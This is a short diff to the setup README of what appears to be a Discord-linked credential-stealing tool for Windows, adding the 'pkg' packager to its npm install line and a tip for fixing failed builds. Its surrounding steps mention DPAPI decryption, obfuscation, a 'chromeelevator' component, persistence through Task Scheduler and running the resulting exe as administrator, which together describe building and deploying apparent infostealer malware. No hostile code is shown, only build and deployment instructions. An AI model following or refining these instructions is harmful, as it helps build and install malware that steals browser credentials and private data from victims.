@@ -16,7 +16,7 @@
 - install nodejs
 - open cmd
 - do cd $directory
-- do npm install discord.js adm-zip @primno/dpapi axios systeminformation form-data javascript-obfuscator
+- do npm install discord.js adm-zip @primno/dpapi axios systeminformation form-data javascript-obfuscator pkg
 - when done run node build.js
 - put in ur stuff
 - done
@@ -36,3 +36,4 @@
 - Add to startup via task schedueler.
 - Note, chromeelevator doesnt work after the first run due to restricted permissions.
 - Make sure you run the exe as administrator or else it kills itself.
+- If building fails do npm install pkg and if it still doesnt work npm install pkg -g 
